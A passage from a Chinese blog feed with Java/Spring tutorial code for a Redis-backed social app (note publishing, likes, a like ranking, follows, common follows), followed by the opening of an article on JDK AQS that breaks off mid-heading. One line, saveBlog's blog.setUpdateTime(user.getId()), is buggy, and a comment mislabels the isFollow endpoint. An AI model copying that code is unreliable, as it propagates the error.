href="#6-2-基于PubSub的消息队列" class="headerlink" title="6.2 基于PubSub的消息队列"></a>6.2 基于PubSub的消息队列</h3><p>PubSub（发布订阅）是Redis2.0版本引入的消息传递模型。</p><ul><li>消费者可以订阅一个或多个channel，生产者向对应channel发送消息后，所有订阅者都能收到相关消息。<ul><li>SUBSCRIBE channel [channel] ：订阅一个或多个频道 </li><li>PUBLISH channel msg ：向一个频道发送消息 </li><li>PSUBSCRIBE pattern[pattern] ：订阅与pattern格式匹配的所有频道</li></ul></li></ul><p>优点：采用发布订阅模型，支持多生产、多消费</p><p>缺点：</p><ul><li>不支持数据持久化</li><li>无法避免消息丢失</li><li>消息堆积有上限，超出时数据丢失</li></ul><h2 id="7-达人探店"><a href="#7-达人探店" class="headerlink" title="7. 达人探店"></a>7. 达人探店</h2><h3 id="7-1-发布探店笔记"><a href="#7-1-发布探店笔记" class="headerlink" title="7.1 发布探店笔记"></a>7.1 发布探店笔记</h3><p>笔记由图片与文字构成，因此需要两个接口：上传图片接口、发布笔记接口。先上传图片，然后点击发布按钮，完成发布。</p><p>上传图片接口：其中需要注意的是，需要修改SystemConstants类下的IMAGE_UPLOAD_DIR，修改为自己本地nginx或者云存储位置。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;upload&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UploadController</span> &#123;<br><br>    <span class="hljs-meta">@PostMapping(&quot;blog&quot;)</span><br>    <span class="hljs-keyword">public</span> Result <span class="hljs-title function_">uploadImage</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;file&quot;)</span> MultipartFile image)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 获取原始文件名称</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">originalFilename</span> <span class="hljs-operator">=</span> image.getOriginalFilename();<br>            <span class="hljs-comment">// 生成新文件名</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> createNewFileName(originalFilename);<br>            <span class="hljs-comment">// 保存文件</span><br>            image.transferTo(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(SystemConstants.IMAGE_UPLOAD_DIR, fileName));<br>            <span class="hljs-comment">// 返回结果</span><br>            log.debug(<span class="hljs-string">&quot;文件上传成功，&#123;&#125;&quot;</span>, fileName);<br>            <span class="hljs-keyword">return</span> Result.ok(fileName);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;文件上传失败&quot;</span>, e);<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>BlogController：完成发布笔记</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/blog&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BlogController</span> &#123;<br><br>    <span class="hljs-meta">@Resource</span><br>    <span class="hljs-keyword">private</span> IBlogService blogService;<br><br>    <span class="hljs-meta">@PostMapping</span><br>    <span class="hljs-keyword">public</span> Result <span class="hljs-title function_">saveBlog</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Blog blog)</span> &#123;<br>        <span class="hljs-comment">//获取登录用户</span><br>        <span class="hljs-type">UserDTO</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> UserHolder.getUser();<br>        blog.setUpdateTime(user.getId());<br>        <span class="hljs-comment">//保存探店博文</span><br>        blogService.saveBlog(blog);<br>        <span class="hljs-comment">//返回id</span><br>        <span class="hljs-keyword">return</span> Result.ok(blog.getId());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="7-2-查看探店笔记"><a href="#7-2-查看探店笔记" class="headerlink" title="7.2 查看探店笔记"></a>7.2 查看探店笔记</h3><p>BlogServiceImpl</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">queryBlogById</span><span class="hljs-params">(Long id)</span> &#123;<br>    <span class="hljs-comment">// 1.查询blog</span><br>    <span class="hljs-type">Blog</span> <span class="hljs-variable">blog</span> <span class="hljs-operator">=</span> getById(id);<br>    <span class="hljs-keyword">if</span> (blog == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-string">&quot;笔记不存在！&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// 2.查询blog有关的用户</span><br>    queryBlogUser(blog);<br>    <span class="hljs-keyword">return</span> Result.ok(blog);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="7-3-点赞功能"><a href="#7-3-点赞功能" class="headerlink" title="7.3 点赞功能"></a>7.3 点赞功能</h3><p>初始时点赞代码位于BlogController的queryBlogLikes接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/likes/&#123;id&#125;&quot;)</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">queryBlogLikes</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;id&quot;)</span> Long id)</span> &#123;<br>    <span class="hljs-comment">//修改点赞数量</span><br>    blogService.update().setSql(<span class="hljs-string">&quot;liked = liked +1 &quot;</span>).eq(<span class="hljs-string">&quot;id&quot;</span>,id).update();<br>    <span class="hljs-keyword">return</span> Result.ok();<br>&#125;<br></code></pre></td></tr></table></figure><p>但是该代码会导致一个用户可以无限地为一篇笔记点赞，显然不符合实际的业务需求。</p><p>需求如下：</p><ol><li>同一个用户只能点赞一次，再次点击则取消点赞</li><li>如果当前用户已点赞，那么点赞按钮需要高亮显示</li></ol><p>实现步骤：</p><ol><li>给Blog类中添加一个isLike字段，标示是否被当前用户点赞</li><li>修改点赞功能，利用Redis的set集合判断是否点赞过，未点赞过则点赞数+1，已点赞过则点赞数-1<ul><li>采用set集合可以对点赞用户进行去重，已点赞的用户存在于某笔记对应的set集合中，则不能再次点赞</li></ul></li><li>修改根据id查询Blog的业务，判断当前登录用户是否点赞过，赋值给isLike字段</li><li>修改分页查询Blog业务，判断当前登录用户是否点赞过，赋值给isLike字段</li></ol><p>代码实现：</p><p>修改BlogController对应的likeBlog接口方法，并重写该方法。具体逻辑见注释。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@PutMapping(&quot;/like/&#123;id&#125;&quot;)</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">likeBlog</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;id&quot;)</span> Long id)</span> &#123;<br>    <span class="hljs-comment">// 修改点赞数量</span><br>    <span class="hljs-keyword">return</span> blogService.likeBlog(id);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">likeBlog</span><span class="hljs-params">(Long id)</span> &#123;<br>    <span class="hljs-comment">// 1.获取登录用户</span><br>    <span class="hljs-type">Long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> UserHolder.getUser().getId();<br>    <span class="hljs-comment">// 2.判断当前登录用户是否点赞</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> BLOG_LIKED_KEY + id;<br>    <span class="hljs-type">Boolean</span> <span class="hljs-variable">isMember</span> <span class="hljs-operator">=</span> template.opsForSet().isMember(key, userId.toString());<br>    <span class="hljs-keyword">if</span> (BooleanUtil.isFalse(isMember)) &#123;<br>        <span class="hljs-comment">// 3.如果未点赞</span><br>        <span class="hljs-comment">// 3.1 数据库点赞数+1</span><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">isSuccess</span> <span class="hljs-operator">=</span> update().setSql(<span class="hljs-string">&quot;liked = liked + 1&quot;</span>).eq(<span class="hljs-string">&quot;id&quot;</span>, id).update();<br>        <span class="hljs-comment">// 3.2 保存用户到Redis的set集合中</span><br>        <span class="hljs-keyword">if</span> (isSuccess) &#123;<br>            template.opsForSet().add(key, userId.toString());<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 4.如果已点赞</span><br>        <span class="hljs-comment">// 4.1 数据库点赞数-1</span><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">isSuccess</span> <span class="hljs-operator">=</span> update().setSql(<span class="hljs-string">&quot;liked = liked - 1&quot;</span>).eq(<span class="hljs-string">&quot;id&quot;</span>, id).update();<br>        <span class="hljs-comment">// 4.2 把用户从Redis的set集合中移除</span><br>        <span class="hljs-keyword">if</span> (isSuccess) &#123;<br>            template.opsForSet().remove(key, userId.toString());<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> Result.ok();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="7-4-点赞排行榜"><a href="#7-4-点赞排行榜" class="headerlink" title="7.4 点赞排行榜"></a>7.4 点赞排行榜</h3><p>功能需求为：在笔记的详情页面，将最先为笔记点赞的前N个人显示出来。</p><p>为满足此功能，我们需要统计每个人为笔记点赞的时间，然后按照该时间将set集合从小到大排序，取出前N个人。</p><p>Redis中的sortedSet可以满足此需求，用时间戳作为其的score属性，可完成时间排序。</p><p>代码实现：</p><ol><li><p>修改点赞的逻辑，即likeBlog方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">likeBlog</span><span class="hljs-params">(Long id)</span> &#123;<br>    <span class="hljs-comment">// 1.获取登录用户</span><br>    <span class="hljs-type">Long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> UserHolder.getUser().getId();<br>    <span class="hljs-comment">// 2.判断当前登录用户是否点赞</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> BLOG_LIKED_KEY + id;<br>    <span class="hljs-type">Double</span> <span class="hljs-variable">score</span> <span class="hljs-operator">=</span> template.opsForZSet().score(key, userId.toString());<br>    <span class="hljs-keyword">if</span> (score == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// 3.如果未点赞</span><br>        <span class="hljs-comment">// 3.1 数据库点赞数+1</span><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">isSuccess</span> <span class="hljs-operator">=</span> update().setSql(<span class="hljs-string">&quot;liked = liked + 1&quot;</span>).eq(<span class="hljs-string">&quot;id&quot;</span>, id).update();<br>        <span class="hljs-comment">// 3.2 保存用户到Redis的zset集合中，根据点赞时间排序</span><br>        <span class="hljs-keyword">if</span> (isSuccess) &#123;<br>            template.opsForZSet().add(key, userId.toString(), System.currentTimeMillis());<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 4.如果已点赞</span><br>        <span class="hljs-comment">// 4.1 数据库点赞数-1</span><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">isSuccess</span> <span class="hljs-operator">=</span> update().setSql(<span class="hljs-string">&quot;liked = liked - 1&quot;</span>).eq(<span class="hljs-string">&quot;id&quot;</span>, id).update();<br>        <span class="hljs-comment">// 4.2 把用户从Redis的zset集合中移除</span><br>        <span class="hljs-keyword">if</span> (isSuccess) &#123;<br>            template.opsForZSet().remove(key, userId.toString());<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> Result.ok();<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>修改点赞列表查询的接口方法：queryBlogLikes</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/likes/&#123;id&#125;&quot;)</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">queryBlogLikes</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;id&quot;)</span> Long id)</span> &#123;<br>    <span class="hljs-keyword">return</span> blogService.queryBlogLikes(id);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">queryBlogLikes</span><span class="hljs-params">(Long id)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> BLOG_LIKED_KEY + id;<br>    <span class="hljs-comment">// 1.查询top5点赞用户</span><br>    Set&lt;String&gt; top5 = template.opsForZSet().range(key, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>    <span class="hljs-keyword">if</span> (top5 == <span class="hljs-literal">null</span> || top5.isEmpty()) &#123;<br>        <span class="hljs-keyword">return</span> Result.ok(Collections.emptyList());<br>    &#125;<br>    <span class="hljs-comment">// 2.解析出用户id</span><br>    List&lt;Long&gt; ids = top5.stream().map(Long::valueOf).collect(Collectors.toList());<br>    <span class="hljs-type">String</span> <span class="hljs-variable">idStrs</span> <span class="hljs-operator">=</span> StrUtil.join(<span class="hljs-string">&quot;,&quot;</span>, ids);<br>    <span class="hljs-comment">// 3.根据用户id查询用户</span><br>    List&lt;UserDTO&gt; users = userService.query()<br>        .in(<span class="hljs-string">&quot;id&quot;</span>, ids)<br>        .last(<span class="hljs-string">&quot;ORDER BY FIELD(id,&quot;</span> + idStrs + <span class="hljs-string">&quot;)&quot;</span>).list()<br>        .stream()<br>        .map(u -&gt; BeanUtil.copyProperties(u, UserDTO.class))<br>        .collect(Collectors.toList());<br>    <span class="hljs-comment">// 4.返回</span><br>    <span class="hljs-keyword">return</span> Result.ok(users);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="8-好友关注"><a href="#8-好友关注" class="headerlink" title="8. 好友关注"></a>8. 好友关注</h2><h3 id="8-1-关注与取关"><a href="#8-1-关注与取关" class="headerlink" title="8.1 关注与取关"></a>8.1 关注与取关</h3><p>关注与被关注是存在于所有用户之间的，因此用一张额外的表 tb_follow 记录这一关系。</p><p>需要编写两个接口：关注取关、判断是否关注</p><p>代码实现：</p><p>FollowController，重写follow与isFollow方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//关注</span><br><span class="hljs-meta">@PutMapping(&quot;/&#123;id&#125;/&#123;isFollow&#125;&quot;)</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">follow</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;id&quot;)</span> Long followUserId, <span class="hljs-meta">@PathVariable(&quot;isFollow&quot;)</span> Boolean isFollow)</span> &#123;<br>    <span class="hljs-keyword">return</span> followService.follow(followUserId, isFollow);<br>&#125;<br><span class="hljs-comment">//取消关注</span><br><span class="hljs-meta">@GetMapping(&quot;/or/not/&#123;id&#125;&quot;)</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">isFollow</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;id&quot;)</span> Long followUserId)</span> &#123;<br>      <span class="hljs-keyword">return</span> followService.isFollow(followUserId);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">follow</span><span class="hljs-params">(Long followUserId, Boolean isFollow)</span> &#123;<br>    <span class="hljs-type">Long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> UserHolder.getUser().getId();<br>    <span class="hljs-keyword">if</span> (isFollow) &#123;<br>        <span class="hljs-comment">// 1.关注则新增数据</span><br>        <span class="hljs-type">Follow</span> <span class="hljs-variable">follow</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Follow</span>();<br>        follow.setFollowUserId(followUserId);<br>        follow.setUserId(userId);<br>        save(follow);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 2.取关则删除数据</span><br>        remove(<span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;Follow&gt;()<br>               .eq(<span class="hljs-string">&quot;user_id&quot;</span>, userId).eq(<span class="hljs-string">&quot;follow_user_id&quot;</span>, followUserId));<br>    &#125;<br>    <span class="hljs-keyword">return</span> Result.ok();<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">isFollow</span><span class="hljs-params">(Long followUserId)</span> &#123;<br>    <span class="hljs-type">Long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> UserHolder.getUser().getId();<br>    <span class="hljs-comment">// 查询是否关注</span><br>    <span class="hljs-type">Integer</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> query().eq(<span class="hljs-string">&quot;user_id&quot;</span>, userId).eq(<span class="hljs-string">&quot;follow_user_id&quot;</span>, followUserId).count();<br>    <span class="hljs-keyword">return</span> Result.ok(count &gt; <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="8-2-共同关注"><a href="#8-2-共同关注" class="headerlink" title="8.2 共同关注"></a>8.2 共同关注</h3><p>共同关注具体为：当前用户查看另外一个用户的主页时，可以查看共同关注，即当前用户与所查看用户的共同关注用户列表</p><p>通过set集合实现共同关注的功能：当调用follow接口关注某人时，可以将被关注的用户放入当前用户对应的一个set集合中，该set集合存储着所有被当前用户关注过的用户。</p><p>代码实现：</p><ol><li><p>修改follow接口方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">follow</span><span class="hljs-params">(Long followUserId, Boolean isFollow)</span> &#123;<br>    <span class="hljs-type">Long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> UserHolder.getUser().getId();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;follows:&quot;</span> + userId;<br>    <span class="hljs-keyword">if</span> (isFollow) &#123;<br>        <span class="hljs-comment">// 1.关注则新增数据</span><br>        <span class="hljs-type">Follow</span> <span class="hljs-variable">follow</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Follow</span>();<br>        follow.setFollowUserId(followUserId);<br>        follow.setUserId(userId);<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">save</span> <span class="hljs-operator">=</span> save(follow);<br>        <span class="hljs-keyword">if</span> (save) &#123;<br>            <span class="hljs-comment">// 将关注用户的id放入redis的set集合中</span><br>            template.opsForSet().add(key, followUserId.toString());<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 2.取关则删除数据</span><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">remove</span> <span class="hljs-operator">=</span> remove(<span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;Follow&gt;()<br>                                .eq(<span class="hljs-string">&quot;user_id&quot;</span>, userId).eq(<span class="hljs-string">&quot;follow_user_id&quot;</span>, followUserId));<br>        <span class="hljs-keyword">if</span> (remove) &#123;<br>            <span class="hljs-comment">// 将关注用户的id从redis的set集合中移除</span><br>            template.opsForSet().remove(key, followUserId.toString());<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> Result.ok();<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>查看共同关注，实现followCommons方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/common/&#123;id&#125;&quot;)</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">followCommons</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;id&quot;)</span> Long id)</span> &#123;<br>    <span class="hljs-keyword">return</span> followService.followCommons(id);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">followCommons</span><span class="hljs-params">(Long id)</span> &#123;<br>    <span class="hljs-comment">// 1.获取当前登录用户</span><br>    <span class="hljs-type">Long</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> UserHolder.getUser().getId();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;follows:&quot;</span> + userId;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">key2</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;follows:&quot;</span> + id;<br>    <span class="hljs-comment">// 2.求交集</span><br>    Set&lt;String&gt; intersect = template.opsForSet().intersect(key, key2);<br>    <span class="hljs-keyword">if</span> (intersect == <span class="hljs-literal">null</span> || intersect.isEmpty()) &#123;<br>        <span class="hljs-keyword">return</span> Result.ok(Collections.emptyList());<br>    &#125;<br>    <span class="hljs-comment">// 3.解析id集合</span><br>    List&lt;Long&gt; ids = intersect.stream().map(Long::valueOf).collect(Collectors.toList());<br>    <span class="hljs-comment">// 4.查询用户</span><br>    List&lt;UserDTO&gt; users = userService.listByIds(ids)<br>        .stream()<br>        .map(u -&gt; BeanUtil.copyProperties(u, UserDTO.class))<br>        .collect(Collectors.toList());<br>    <span class="hljs-keyword">return</span> Result.ok(users);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>数据库及缓存</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Redis</tag>
      
      <tag>分布式</tag>
      
      <tag>缓存</tag>
      
      <tag>秒杀</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>详解JDK锁02:AQS</title>
    <link href="/2022/10/21/%E8%AF%A6%E8%A7%A3JDK%E9%94%8102%EF%BC%9AAQS/"/>
    <url>/2022/10/21/%E8%AF%A6%E8%A7%A3JDK%E9%94%8102%EF%BC%9AAQS/</url>
    
    <content type="html"><![CDATA[<h1 id="详解JDK锁02：AQS"><a href="#详解JDK锁02：AQS" class="headerlink" title="详解JDK锁02：AQS"></a>详解JDK锁02：AQS</h1><h2 id="1-AQS简述"><a href="#1-AQS简述" class="headerlink" title="1.  AQS简述"></a>1.  AQS简述</h2><p>这一部分，我将从是什么、干什么、怎么用三个角度简单讲述一下AQS</p><h3 id="1-1-是什么？"><a href="#1-1-是什么？" class="headerlink" title="1.1 是什么？"></a>1.1 是什么？</h3><p>AQS全称为AbstractQueuedSynchronizer，中文名称为队列同步器。</p><p>拆分一下中文就可知，一定离不开 <strong>队列</strong> 与 <strong>同步</strong> 这两个概念，下面进一步讲解其作用。</p><h3 id="1-2-干什么？"><a href="#1-2-干什么？" class="headerlink" title="1.2 干什么？"></a>1.2 干什么？</h3><p>AQS是用来构建锁或者其他同步组件的基础框架。</p><p>学Java并发的话就重点关住于AQS是如何构建锁的，因为同步器是实现锁的关键！</p><ol><li><p>AQS用一个 <code>int</code> 成员变量来表示同步状态。通过修改同步状态，以此达到获取锁与释放锁的目的。</p><p>比如说一个线程获取到了锁，那么就相当于它此时获取到了同步状态。</p><p>一个线程执行完了它的任务，它去释放锁，就相当于释放同步状态。</p></li><li><p>AQS通过内置的 <code>FIFO队列</code> 完成线程的排队工作。</p><p>这一点其实并不难理解。当一个线程获取锁失败之后，可以选择陷入阻塞状态，也可以进行非阻塞地自旋重试；当有多个线程独占式地去获取锁时，只有一个线程可以获取成功，其它均会失败。那么应当如何管理这些竞争失败的锁呢？这便是队列的作用。</p><ul><li>线程获取锁失败时，便进行入队列操作，成为队列的尾结点，进入等待状态</li></ul></li></ol><h3 id="1-3-怎么用？"><a href="#1-3-怎么用？" class="headerlink" title="1.3 怎么用？"></a>1.3 